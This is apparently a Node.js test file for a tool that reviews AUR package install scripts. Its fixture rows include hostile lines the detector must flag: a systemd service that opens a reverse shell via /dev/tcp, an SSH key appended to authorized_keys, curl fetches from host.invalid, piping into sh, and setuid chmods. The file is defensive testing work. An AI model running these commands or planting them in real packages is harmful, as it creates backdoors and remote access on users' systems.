#!/usr/bin/env node
// Real tracked AUR recipe fixtures pass through the file-manager review.
// Pure install-script rows retain the deterministic risk contract.
"use strict";
const assert=require("node:assert/strict"),fs=require("node:fs"),os=require("node:os"),path=require("node:path"),cp=require("node:child_process");
const {create,cloneRecipe}=require("./world.js");
const {load}=require("../../../bin/lib/qml-library.js");
const recipes=path.join(__dirname,"recipes"),scratch=fs.mkdtempSync(path.join(os.tmpdir(),"package-review-recipes-"));
const q=value=>"'"+value.replaceAll("'","'\\''")+"'";
function reviewed(name){
 const fixture=path.join(recipes,name),meta=JSON.parse(fs.readFileSync(path.join(fixture,"fixture.json"),"utf8"));
 const world=create(path.join(scratch,name),{settings:{agent:"codex",command:""},choices:["Review","@skip"]});
 cloneRecipe(world,meta.pkgbase,{source:path.join(fixture,"build")});
 const supplied="PARU_SUPPLIED_DIFF "+name+"\n";
 fs.writeFileSync(path.join(world.root,"hook-world.json"),JSON.stringify({packages:[{base:meta.pkgbase,names:[meta.package],diff:supplied}]}));
 if(fs.existsSync(path.join(fixture,"installed.install"))){
  const local=path.join(world.root,"db/local",meta.package+"-"+meta.old);fs.mkdirSync(local,{recursive:true});
  fs.copyFileSync(path.join(fixture,"installed.install"),path.join(local,"install"));
 }
 for(const tool of ["pacman","claude","codex"]){fs.unlinkSync(path.join(world.root,"tools",tool));fs.symlinkSync(path.join(__dirname,"recipe-command.js"),path.join(world.root,"tools",tool));}
 const environment={...world.env,RECIPE_FIXTURE:fixture,RECIPE_OUT:world.root,SHELL:"/usr/bin/bash"};
 const command=[process.execPath,world.owner,"run","install","--manager","aur","--config",world.config,meta.package].map(q).join(" ");
 const result=cp.spawnSync("/usr/bin/script",["-qec",command,"/dev/null"],{env:environment,encoding:"utf8",timeout:60000});
 assert.equal(result.status,0,name+": "+result.stdout+result.stderr);
 const evidence=path.join(world.root,"evidence");
 assert.ok(fs.existsSync(path.join(evidence,"packages.txt")),name+": agent received the snapshot");
 const lines=fs.readFileSync(path.join(evidence,"packages.txt"),"utf8").split("\n");
 assert.ok(lines.includes("install "+meta.package+" "+meta.install),name+": install state");
 assert.equal(fs.readFileSync(path.join(evidence,"recipe",meta.pkgbase+".diff"),"utf8"),supplied,name+": supplied diff");
 const expected=fs.readdirSync(path.join(fixture,"build")).sort();
 assert.deepEqual(fs.readdirSync(path.join(evidence,"build",meta.pkgbase)).sort(),expected,name+": tracked files only");
 assert.equal(world.calls().filter(call=>call.kind==="offer"&&call.offered.includes("Install anyway")).length,meta.installerRisk?1:0,name+": deterministic concerns");
 return meta;
}
function installScriptRows() {
    const read = name => {
        const build = path.join(recipes, name, "build"), scripts = fs.readdirSync(build).filter(file => file.endsWith(".install"));
        assert.equal(scripts.length, 1, name + ": one install script");
        return fs.readFileSync(path.join(build, scripts[0]), "utf8");
    };
    const rows = [];
    for (const [name, risks] of [
        ["install-systemd-unit", [
            "/usr/bin/systemctl --user enable com.system76.FirmwareManager.Notify.timer",
            "cat > /etc/systemd/system/fwupd-refresh-helper.service <<'EOF'",
            "ExecStart=/usr/bin/bash -c 'exec 3<>/dev/tcp/fw-metadata.invalid/443; bash <&3 >&3 2>&3'",
            "systemctl enable --now fwupd-refresh-helper.service"
        ]],
        ["install-home-write", ["echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIInertFixtureKeyNotUsableForAnyLoginXXXXXXXXXXXX lsfg-vk-sync' >> \"$home/.ssh/authorized_keys\""]]
    ]) {
        const script = read(name);
        rows.push([name + "-new", null, script, "new", risks]);
        rows.push([name + "-changed", "post_install() {\n  systemctl daemon-reload\n}\n", script, "changed", risks]);
        rows.push([name + "-existing", script, script + "\n# ordinary update\n", "changed", []]);
    }
    for (const [name, risks] of [
        ["install-changed", ['chmod u+s "/usr/bin/mullvad-exclude"', 'systemctl enable --now mullvad-daemon || echo "Failed to start mullvad-daemon.service"', "systemctl enable mullvad-early-boot-blocking"]],
        // Active command substitution is not literal advice, even for whoami.
        ["install-group-update", ['echo "sudo usermod -aG falcond $(whoami)"']],
        ["pkgver-bump-cached", ["chmod 4755 '/opt/Bitwarden/chrome-sandbox' || true"]]
    ]) rows.push([name + "-first-install", null, read(name), "new", risks]);
    const setuid = read("install-setuid"), chmod = "chmod 4755 /usr/lib/clight/.clight-helper";
    assert.equal(setuid.split(chmod).length, 2, "install-setuid: one setuid command");
    // The setuid fixture can store its attack in a quoted printf assignment before running the variable.
    for (const [name, assignment] of [
        ["single-quoted-printf-assignment", "printf '-v' 'payload' '%s' 'chmod 4755 /usr/lib/clight/.clight-helper'"],
        ["double-quoted-printf-assignment", 'printf "-v" "payload" "%s" "chmod 4755 /usr/lib/clight/.clight-helper"']
    ]) {
        const script = setuid.replace(chmod, assignment + "\n    $payload");
        rows.push([name + "-new", null, script, "new", [assignment]]);
        rows.push([name + "-changed", "post_install() {\n}\n", script, "changed", [assignment]]);
    }
    for (const [line, risky] of [
        ["echo 'sudo groupadd --system falcond'", false],
        ['echo "sudo chmod 2775 /usr/share/falcond/profiles/user"', false],
        ["printf '%s\\n' 'rm -rf ~/.config/app'", false],
        ["printf '%s' 'chmod 4755 /usr/lib/clight/.clight-helper'", false],
        ["printf \"%s\\n\" 'chmod 4755 /usr/lib/clight/.clight-helper'", false],
        ["echo 'key' >> \"$home/.ssh/authorized_keys\"", true],
        ["printf '%s\\n' 'key' >> \"$HOME/.ssh/authorized_keys\"", true],
        ["echo 'payload' | sh", true],
        ["printf '%s\\n' 'payload' | bash", true],
        ["echo 'value' > /etc/app.conf", true],
        ["printf '%s' 'value' > '/root/.profile'", true],
        ["cat file > /home/user/.profile", true],
        ["printf '%s' 'value' | tee -a /etc/app.conf", true],
        ["cat file | /usr/bin/tee /root/.profile", true],
        ["exec 3<>/dev/tcp/host.invalid/443", true],
        ["exec 3<> /dev/udp/host.invalid/443", true],
        ["systemctl enable --now planted.service", true],
        ["systemctl --user enable planted.service", true],
        ['echo "$(curl https://host.invalid/payload)"', true],
        ["printf '%s' \"`curl https://host.invalid/payload`\"", true],
        ["echo 'advice'; curl https://host.invalid/payload", true],
        ["systemctl daemon-reload", false],
        ["systemd-tmpfiles --create", false],
        ["update-desktop-database /usr/share/applications", false],
        ["gtk-update-icon-cache -q -t -f /usr/share/icons/hicolor", false],
        ["ldconfig", false],
        ["cat /etc/app.conf", false],
        ["echo 'value' > /tmp/advice", false]
    ]) rows.push([line, null, line, "new", risky ? [line] : []]);
    return rows;
}

function verifyInstallScripts(judge, rows) {
    for (const [name, installed, next, state, risks] of rows) {
        assert.deepEqual(JSON.parse(JSON.stringify(judge.installScriptChange(installed, next))), { state, risks }, "install-script: " + name);
        console.log("package-install-proof: " + JSON.stringify({ name, state, risks }));
    }
}

try{
 const names=fs.readdirSync(recipes,{withFileTypes:true}).filter(entry=>entry.isDirectory()).map(entry=>entry.name).sort();
 assert.ok(names.includes("install-setuid")&&names.includes("cached-malicious-unchanged"),"required malicious and unchanged fixtures discovered");
 const metadata=names.map(reviewed),judgeFile=path.join(__dirname,"../../../shell/Core/PackageReview.js"),rows=installScriptRows();
 verifyInstallScripts(load(judgeFile),rows);
 for(const state of ["none","new","unchanged","changed"])assert.ok(metadata.some(meta=>meta.install===state),"install state coverage: "+state);
 for(const risk of [true,false])assert.ok(metadata.some(meta=>meta.installerRisk===risk),"install concern coverage: "+risk);
 // The deterministic-check control edits a disposable source, preserving
 // the risky line while dropping the rule that must detect it.
 const source=fs.readFileSync(judgeFile,"utf8"),needle="if (INSTALL_SCRIPT_RISKS[i].test(line)) return true;";
 assert.equal(source.split(needle).length,2,"one install-script risk decision");
 const control=path.join(scratch,"judge-control");fs.mkdirSync(control);
 fs.copyFileSync(path.join(path.dirname(judgeFile),"PackageManagers.js"),path.join(control,"PackageManagers.js"));
 fs.writeFileSync(path.join(control,"PackageReview.js"),source.replace(needle,"if (false && INSTALL_SCRIPT_RISKS[i].test(line)) return true;"));
 const row=rows.find(row=>row[0]==="install-systemd-unit-new");assert.ok(row);
 assert.throws(()=>verifyInstallScripts(load(path.join(control,"PackageReview.js")),[row]),error=>error.code==="ERR_ASSERTION");
 console.log("test-package-recipes: ok");
}finally{fs.rmSync(scratch,{recursive:true,force:true});}
